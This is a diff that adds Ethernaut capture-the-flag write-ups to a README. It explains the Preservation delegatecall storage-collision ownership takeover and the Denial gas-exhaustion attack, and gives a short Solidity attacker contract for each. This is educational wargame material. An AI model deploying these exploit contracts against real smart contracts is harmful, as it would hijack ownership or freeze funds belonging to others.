@@ -104,3 +104,49 @@ To run the solution:
 ```
 $ npm run reentrancy
 ```
+
+### [16. Preservation](https://ethernaut.openzeppelin.com/level/0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F)
+
+With `delegatecall`, you can call a function of another contract on your contract's state variables. However, this function is executed on the state variable's slot position in storage and not on the state variables name. In other words, as `LibraryContract.setTime` accesses the variable stored in the first slot in storage, when `Preservation.setFirstTime` is called, the variable stored in the first slot of the instance of `Preservation` will be accessed, that is `timeZone1Library` and not `storedTime`. To become the owner of the `Preservation` contract:
+
+1. Deploy the `PreservationAttacker` contract
+2. Call either `Preservation.setFirstTime` or `Preservation.setSecondTime` passing in the address of the `PreservationAttacker` instance
+3. Call the function called in step 2 again, this time passing in the attacker's wallet address
+
+```solidity
+pragma solidity ^0.6.0;
+
+contract PreservationAttacker {
+    address doesNotMatter1;
+    address doesNotMatter2;
+    address public owner;
+
+    function setTime(uint256 time) public {
+        owner = address(uint160(time));
+    }
+}
+```
+
+### [18. Recovery](https://ethernaut.openzeppelin.com/level/0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2)
+
+<!-- https://medium.com/coinmonks/ethernaut-lvl-18-recovery-walkthrough-how-to-retrieve-lost-contract-addresses-in-2-ways-aba54ab167d3 -->
+
+### [19. Magic Number](https://ethernaut.openzeppelin.com/level/0x200d3d9Ac7bFd556057224e7aEB4161fED5608D0)
+
+<!-- https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 -->
+
+### [20. Denial](https://ethernaut.openzeppelin.com/level/0xf1D573178225513eDAA795bE9206f7E311EeDEc3)
+
+In this problem, the vulnerability relies in the use of `call`. `.send()` and `.transfer()` have a gas limit of 2300 gas. The `Denial` does not restrict the maximum amount of gas to use. Implementing the `AttackDenial.receive()` function to drain all the funds of `Denial` will prevent the owner from withdrawing funds. Here we use an infinite loop. The `AttackDenial` needs to be set as partner for the attack to work.
+
+```solidity
+pragma solidity ^0.6.0;
+
+contract AttackDenial {
+    receive() external payable {
+        while(true) {}
+    }
+}
+```
+
+### [21. Shop](https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB)
